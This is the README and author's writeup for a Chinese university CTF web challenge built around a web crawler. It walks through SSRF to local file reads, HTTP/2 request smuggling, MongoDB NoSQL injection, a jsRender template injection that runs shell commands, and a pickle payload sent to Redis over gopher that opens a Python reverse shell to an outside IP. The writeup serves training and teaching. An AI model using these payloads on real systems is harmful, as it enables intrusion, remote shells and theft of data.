# cn55spider

This repo includes the source code of *[CNSS](https://cnss.io) Recruit 2022* web challenge named `cn55spider`.

## 前言

写给招新赛的 Web 压轴题，由于本人比较懒惰倦怠，只出了这一道 Web 缝合套娃题，甚至一度觉得难度没有学弟出的内网题目难度大

编排过程中的 idea 几乎都是参考现成赛事加以个人的拙劣魔改（~~鉴定为会搜索有手就行~~），衷心希望新同学们在招新期间入门能找到适合自己的学习方法，掌握核心搜索技巧（

本题的场景是用户可作为 guest 提交 entry url 供爬虫爬取，爬虫爬取 entry 后会在结果中提取链接继续爬取内容，guest 可凭 guest name 以及 entry url 查询爬取结果

大致思路如下，

1. scrapy --> SSRF to LFI 读取 scrapy 爬虫本地配置文件
2. proxy --> HTTP2 走私 app 的 `/admin` 路由
3. app(guest) --> NoSQL Injection 可查询预留 guest 用户 casio3 爬取过的 flag
4. app(admin) --> NodeJS SSTI RCE
5. app(admin) --> mongodb --> search 接口查 admin 预留的 flag
6. app(admin) --> SSRF 打认证 Redis --> Pickle  反序列化 RCE (scrapy)

其中 app 和 db 不出网



## Setup

题目生产环境使用 prod 文件部署

`app_dumper.sh` 用于记录访问流量，`app_flush.sh` 用于清理 app 日志，定时清理的话可以在主机写 crontab

由于 proxy 需要用到 HTTP2，为 HTTPS 配置的证书置于  `proxy/certs/`  目录下，需自行创建，entrypoint 已经写好了 localhost 的自签证书，在 `proxy/hitch.conf` 中将 `pem-file` 改为需要使用的证书文件即可

sh 脚本加执行权限

```bash
find . -type f -name "*.sh" -exec chmod +x {} \;
```

> 作为新生赛，每步 flag 都有对应题目描述，从简起见就略去了



## Writeup

exploits 比较杂乱就没有放出来，这里记录一下每一步 flag 的流程

- 读配置

  ```html
  <a href="file:///proc/self/cmdline">
  ```

  尝试几次爬取可以推知爬虫逻辑，然后自行构造恶意页面供爬虫爬取，拿到 cmdline、environ 等基础信息，去看一些 scrapy 相关文档得知架构，摸到爬虫配置再一系列闪电五连鞭可以读爬虫的源码，第一步的 flag 位置提示直接放进了 `settings.py`，到这儿直接去读就可以
  
  另外前端的 pow solver 是后来给的，本意是想让选手自行写一下，be like
  
  ```python
  import requests
  from pwn import *

  url = 'https://challenge.address/'
  charset = string.ascii_letters + string.digits
  user = 'N0obcAs10'
  entry_url = 'http://baidu.com/'

  s = requests.Session()
  s.verify = False
  requests.urllib3.disable_warnings(requests.urllib3.exceptions.InsecureRequestWarning)


  def solve_pow():
      html = s.get(url=url).text
      task = re.search(r"== \w{6}", html)[0][-6:]
      log.info(f"Q: md5(xxxx)[-6:] == {task}")
      proof = iters.mbruteforce(lambda x: md5sumhex(x.encode())[-6:] == task, alphabet=charset, length=4, method='fixed')
      if proof:
          log.success(f"A: md5({proof}) == {md5sumhex(proof.encode())}")
          return proof
      else:
          log.failure("solution not found, check it.")
          return None


  def push_entry(username, entry):
      proof = solve_pow()
      res = s.post(url=url + 'guest/crawl',
                  data={"username": username, "entry": entry, "proof": proof})
      if "Success" in res.text:
          log.success(f"{username} push entry: {entry}")
      else:
          log.failure("push failed.")


  push_entry(user, entry_url)

  ```
  
- 请求走私

  ```
  POST / HTTP/2
  Host: challenge.address
  Content-Length: 0
  
  GET /admin HTTP/1.1
  Host: app:8082
  ```

  观察 Response Header 是可以看到 `X-Varnish` 的，后续 hint 也给出了 [Wappalyzer](https://chrome.google.com/webstore/detail/wappalyzer-technology-pro/gppongmhjkpfnbhagpmjfkannfbllamg) 提示查看网站技术栈，搜寻漏洞可以摸到 **[CVE-2021-36740](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36740)**，且题目 guest 和 admin 比较明显，访问 admin 路由会出现 `Access Denied` 字样，推知走私 admin 的思路

  构造过程中注意开头发 POST 包，且发包间隔不能太长，这样能被封装到一个 TCP packet 内（具体可以自行 dump 流量看）

  构造好的请求到 varnish 后，HTTP2 转 HTTP1.1 再发给后端 app 就会被拆分，绕过 proxy 处对 Authorization 的鉴权

- NoSQL Injection 1

  经验丰富可以猜到数据库是 MongoDB ？没猜到也可以 RCE 读完源码再审计

  这一步题目描述里阐明了有一位名为 casio3 的 guest 用户已经爬好了 flag，但我们无法得知 TA 用的 entry url

  需要想办法查询读取，payload 如下

  ```
  ?username=casio3&entry[$ne]=null
  ```

- NodeJS SSTI RCE (jsRender)

  用 jsRender 直接塞了个 RCE 洞给选手，注意到访问 admin 路由有 Set-Cookie 设置默认的 admin name，且回显中有 admin，尝试修改名称发现 welcome banner 有相应变化，再凭此测试 SSTI payload 即可

  ```
  Cookie: admin_name={{:"pwnd".toString.constructor.call({},"return global.process.mainModule.constructor._load('child_process').execSync('cat /etc/passwd').toString()")()}}
  ```

  RCE 是向后续进阶的关键步骤，虽然 app 不出网，但能执行命令看回显也够了，查看当前目录即可拿到本步骤 flag，同时顺便把 app 的源码拿了，这需要对 node 的项目部署有基本了解，另外信息搜集的时候可以发现使用了 pm2 管理，后续有用

- NoSQL Injection 2

  这里将 XS-Leaks 的考法换成了对 MongoDB 的更深一步探索，需查询[文档](https://www.mongodb.com/docs/manual/reference/bson-types/)或追溯源码

  `/admin/search` 路由的查询逻辑如下

  ```javascript
  let page = await Pages.find({
      role: role,
      username: username,
      text: keyword
  })
  ```

  而 text 字段的 type 在 Schema 中查看可知为 `Buffer`，这是一个神奇的类型，在 mongoose 的定义中它是 SchemaBuffer， MongoDB 中它是 BinData，总之它不支持 `$regex` 正则查询

  ```javascript
  // app/src/node_modules/mongoose/lib/schema/buffer.js
  SchemaBuffer.prototype.$conditionalHandlers =
      utils.options(SchemaType.prototype.$conditionalHandlers, {
        $bitsAllClear: handleBitwiseOperator,
        $bitsAnyClear: handleBitwiseOperator,
        $bitsAllSet: handleBitwiseOperator,
        $bitsAnySet: handleBitwiseOperator,
        $gt: handleSingle,
        $gte: handleSingle,
        $lt: handleSingle,
        $lte: handleSingle
      });
  ```

  基于此我们可使用位查询操作，具体参阅 MongoDB 的[文档](https://www.mongodb.com/docs/v4.2/reference/operator/query/bitsAllClear/)，于是有 payload

  ```
  username=admin&role=admin&keyword[$bitsAllClear]=0
  ```

  但由于我们的请求走私拆分了报文，这个 payload 是不一定拿到回显的

  于是就用到了上面信息搜集发现的 pm2，注意到源码中开发者将查询用 `console.log` 记录，我们找到 pm2 [日志](https://pm2.io/docs/runtime/guide/log-management/)的路径就能拿到查询的记录，直接逐位爆破，部分 log 如下

  ```
  {"status":"failed","keyword":{"$bitsAllClear":["1"]},"search_time":"1664255805"}
  {"status":"success","keyword":{"$bitsAllClear":["8"]}}
  {"status":"success","keyword":{"$bitsAllClear":["7"]}}
  {"status":"failed","keyword":{"$bitsAllClear":["6"]},"search_time":"1664255805"}
  {"status":"failed","keyword":{"$bitsAllClear":["5"]},"search_time":"1664255805"}
  {"status":"success","keyword":{"$bitsAllClear":["4"]}}
  {"status":"success","keyword":{"$bitsAllClear":["3"]}}
  {"status":"success","keyword":{"$bitsAllClear":["2"]}}
  {"status":"failed","keyword":{"$bitsAllClear":["1"]},"search_time":"1664255806"}
  {"status":"failed","keyword":{"$bitsAllClear":["9"]},"search_time":"1664255806"}
  {"status":"failed","keyword":{"$bitsAllClear":["1P"]},"search_time":"1664255826"}
  {"status":"failed","keyword":{"$bitsAllClear":["14"]},"search_time":"1664255826"}
  ```

  因为网络等问题不一定能稳出，所以建议用 Set 查询这样能保证 success 的信息准确，且爆破超出范围后也不会影响 flag 判断

  贴出一段处理 log 的脚本也基于此种查询

  ```python
  # exploits/resolve.py
  import json
  
  bits = ['0' for _ in range(196)]
  
  with open('./res.txt', 'r') as f:
      lines = f.readlines()
  
  for line in lines:
      try:
          l = json.loads(line)
          if l['status'] == 'success':
              bits[int(l['keyword']['$bitsAllSet'][0])] = '1'
      except Exception as e:
          pass
  
  def div(flag: list, step: int):
      length = len(flag)
      for i in range(0, length, step):
          yield flag[i:i+step]
  
  for byte in div(bits, 8):
      byte = '0b'+''.join(byte)[::-1]  # endian reverse
      i = int(byte, base=2)
      print(chr(i), end='')
  
  ```

  （~~如果对 admin 路由的源码有槽点可以理解为开发者尚未开发完备~~）

- SSRF redis to scrapy

  用 curl 请求 redis 服务即可，SSRF 认证打 Redis 以及 scrapy 不安全的 pickle 反序列化已经有很多现成资料了

  exp，对现有的认证 payload 生成稍有改写，不敢妄称优化，只支持 python3

  ```python
  #!/usr/bin/env python3
  import pickle
  import os
  from urllib.parse import quote
  
  
  class Exp(object):
      def __reduce__(self):
          s = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("114.5.1.4",19198));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
          return (os.system, (s,))
  
  
  IFS = r'IFS'
  evil = pickle.dumps(Exp())
  print(evil)
  
  
  def redis_format(arr):
      cmd = ""
      CRLF = "\r\n"
      if isinstance(arr, str):
          arr = arr.encode()
      redis_arr = arr.split(IFS.encode())
      cmd += quote(f'*{len(redis_arr)}{CRLF}')
      for param in redis_arr:
          cmd += quote(f'${len(param)}{CRLF}')
          cmd += quote(param)
          cmd += quote(CRLF)
      return cmd
  
  
  protocol = "gopher://"
  host = "redis"
  port = "6379"
  passwd = "sTrOnG_R3D1s_p@s5woRd_HeRE"
  
  cmds = ["flushall",
          f"ZADD{IFS}recruit:requests{IFS}0{IFS}".encode() + evil,
          "quit"
          ]
  if passwd:
      cmds.insert(0, f"AUTH{IFS}{passwd}")
  
  payload = protocol+host+":"+port+"/_"
  
  for cmd in cmds:
      payload += redis_format(cmd)
  
  print(payload)
  
  ```

  注意一下 pickle 的 payload 生成出来在 Windows 下是 nt，建议直接 Linux 下跑或者换利用思路

  打的时候二次编码一下





## 后记

一开始想出 爬虫+XS-Leaks 来着，后来因为种种因素弃置了，套上了其他考点，深挖了一步 MongoDB 的东西

![image-20221108180436437](https://s2.loli.net/2022/11/08/zJdkpboLK21rAn5.png)

题目的诞生很大程度上参考了北方姐姐出给 ByteCTF2020 的 easy_scrapy 和陆队出给 TQLCTF2022 的 A More Secure Pastebin

塞了一些中途打的比赛遇到的考点，下面 Reference 一并给出，另有一些参考甚至尝试过的资料最终因为各种原因没有采用的方案（遗憾的是出题的时候北方的博客已经关了，曾经看过博客中的出题笔记，有不少出题人的思考值得品读，最终 scrapy 部分的环境是参考其他选手的赛后 writeup 写出来的）

此外题目有多处细碎的地方没有优化，因时间和精力的原因搁置了（又不是不能跑.jpg）

比如环境变量、配置文件、变量命名、前端呈现等都可以再整理，HTTP 走私、app 的 log 也有上车的机会，鉴于做的人也不是很多（到最后也没人打穿，不像去年被新生 A 穿 Web），这样出还行了 :)

再者题目的非预期测试并不完备，举个栗子 RCE 的威力还是很大的，曾经~~变态~~群友就问过可 RCE 的环境但不能文件落地、不出网、(还有啥限制忘了)的利用方式，本题的 app 理论上可能还可以建立隧道(有层 proxy 挺麻烦的，考虑走 web 端口？)、文件落地等来优化 RCE 的利用



### Troubleshooting

- pyOpenSSL 在 9 月 26 号 更新到 22.1.0，scrapy 一瞬就跑不起来了 --> requirements 里把版本写死

  ```
  module 'OpenSSL.SSL' has no attribute 'SSLv3_METHOD'
  ```

- `mongo:latest` 镜像有了变化， db init 写失败了，大抵是船新版本的 `mongo` 变成 `mongosh` 的原因 --> 改回 4.2

- 数据表 https://www.jianshu.com/p/b32e79bea9df

- ……





### Reference

easy_scrapy

https://bytectf.feishu.cn/docs/doccnqzpGCWH1hkDf5ljGdjOJYg#bFxJPC

https://ca01h.top/Web_security/ctf_writeup/26.ByteCTF2020-scrapy-redis%E5%A4%8D%E7%8E%B0/

https://www.jianshu.com/p/0823666a7687

https://xz.aliyun.com/t/8434

https://ablacknut.github.io/post/bytectf2020-easy_scrapy-fu-xian/

A More Secure Pastebin

https://blog.zeddyu.info/2022/02/21/2022-02-21-PracticalTimingTimeless/#challenge

https://funnything.net/2022/02/21/TQLCTF-Web-A-More-Secure-Pastebin/

NoSQL Injection

https://book.hacktricks.xyz/pentesting-web/nosql-injection

HTTP Request Sumggling

https://labs.detectify.com/2021/08/26/how-to-set-up-docker-for-varnish-http-2-request-smuggling/

https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-cl-request-smuggling

CSAW'22



### Deprecated

XS-Leaks

https://www.scuctf.com/ctfwiki/web/9.xss/xsleaks/

md-to-pdf

https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf#discovery

https://github.com/simonhaenisch/md-to-pdf/issues/99

Gerapy

https://mp.weixin.qq.com/s/-TkfZru1ED-YRxhPMjPJsA

https://blog.csdn.net/weixin_45778886/article/details/122332845

https://docs.gerapy.com/en/latest/

Scrapyd

https://scrapyd.readthedocs.io/en/latest/

https://www.leavesongs.com/PENETRATION/attack-scrapy.html

jsPDF

https://codepen.io/nagasai/pen/JKKNMK
